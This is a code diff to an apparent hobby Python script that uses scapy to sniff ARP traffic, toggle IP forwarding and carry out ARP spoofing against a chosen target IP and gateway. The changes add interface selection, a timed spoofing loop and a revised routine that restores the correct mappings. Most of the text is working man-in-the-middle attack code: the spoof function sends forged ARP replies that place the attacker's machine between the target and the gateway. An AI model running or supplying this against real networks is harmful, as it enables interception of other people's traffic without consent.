@@ -5,11 +5,11 @@ from scapy.modules import *
 from scapy import *
 import scapy.all as scapy
 from sys import platform
+import time
 
 
 
 #Sniffing all broadcast packets
-
 
 
 def arp_monitor_callback(pkt):
@@ -20,8 +20,11 @@ def arp_monitor_callback(pkt):
         return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
 
 
-def do_sniff(num_packets):
-    sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets)
+def do_sniff(num_packets, *interface):
+    if interface:
+        sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets, iface=interface)
+    else:
+        sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets)
     print('Sniffing complete. ARP packets saved to mitm_attack/arp_monitor.pcap')
 
 
@@ -52,35 +55,53 @@ def toggle_IP_forward():
                 else:
                     with open(path, "wb") as file:
                         file.write(b'1')
+        main()
     elif platform == 'darwin':
         print('MacOS not supported yet.')
-        exit()
+        main()
     elif platform == 'win32':
-        print('Enable IP forwarding with "run" regedit: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters')
+        print('Enable IP forwarding with "run" regedit: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableRouter')
+        main()
 
 def view_working_pcap():
     packets = read_bytes_from_pcap()
     for k in packets.keys():
         print(f'MAC: {k} | Src.IP: {packets[k][1]}')
 
-def spoof(target_ip, gateway_ip):
+
+def spoof(target_ip, gateway_ip, *interface):
     packet_dict = read_bytes_from_pcap()
     target1_mac = get_mac_of_target(target_ip, packet_dict)
     gateway_mac = get_mac_of_target(gateway_ip, packet_dict)
 
-    scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac))
-    scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
-    
-def send_fix(target_ip, gateway_ip):
+    if interface:
+        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac), iface=interface)
+        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=interface)
+    else:
+        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac))
+        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
+
+
+def send_fix(target_ip, gateway_ip, *interface):
     packet_dict = read_bytes_from_pcap()
     target1_mac = get_mac_of_target(target_ip, packet_dict)
     gateway_mac = get_mac_of_target(gateway_ip, packet_dict)
-    scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target1_mac))
-    scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac))
+    if interface:
+        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac, hwsrc=gateway_mac), iface=interface)
+        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target1_mac), iface=interface)
+    else:
+        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac, hwsrc=gateway_mac))
+        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target1_mac))
+
 
 def main():
 
     print('Welcome to the ARP monitor and spoofer') #lets make a better name for this lol
+    is_inface = input('Would you like to specify an interface? (y/n): ')
+    if is_inface == 'y':
+        interface = input('Enter interface name: ')
+    else:
+        interface = None
     user_in = input('What would you like to do? (1) Monitor ARP packets (2) Spoof ARP packets (3) View working pcap (4) Toggle IP Forwarding (5) Fix ARP spoof (6) Exit \n')
     if user_in != '1' and user_in != '2' and user_in != '3' and user_in != '4' and user_in != '5' and user_in != '6':
         print('Invalid input. Please try again.')
@@ -88,7 +109,7 @@ def main():
     elif user_in == '1':
         num_packets = input('how many packets would you like to sniff? ')
         print(f'Sniffing {num_packets} ARP packets...')
-        do_sniff(int(num_packets))
+        do_sniff(int(num_packets), interface)
         main()
     elif user_in == '2':
         target = input('What is the target IP? ')
@@ -96,7 +117,8 @@ def main():
         print('Spoofing ARP packets...')
         print('Press CTRL+C to stop spoofing.')
         while True:
-            spoof(target, gateway)
+            time.sleep(1)
+            spoof(target, gateway, interface)
     elif user_in == '3':
         view_working_pcap()
     elif user_in == '4':
@@ -106,7 +128,7 @@ def main():
         gateway = input('What is the gateway IP? ')
         print('Fixing ARP packets...')
         for _ in range (16):
-            send_fix(target, gateway)
+            send_fix(target, gateway, interface)
     elif user_in == '6':
         exit()
 
